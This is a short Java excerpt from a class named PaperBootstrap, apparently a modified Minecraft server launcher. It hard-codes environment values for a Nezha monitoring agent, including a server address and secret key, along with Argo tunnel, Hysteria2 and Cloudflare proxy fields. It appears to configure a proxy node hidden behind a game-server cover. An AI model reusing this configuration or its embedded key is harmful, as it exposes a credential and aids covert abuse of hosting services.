...
public final class PaperBootstrap {
    ...
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "80b0776a-aadd-407f-85a7-758f7dd7e205");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "a.holoy.dpdns.org:26805");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "NwxKJwM9UKRCX5TBPaBm0IrjNCSyflif");
        envVars.put("ARGO_PORT", "");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "40310");
        ...
        envVars.put("CFIP", "");
        envVars.put("CFPORT", "");
        envVars.put("NAME", "heavenmusic.xyz");
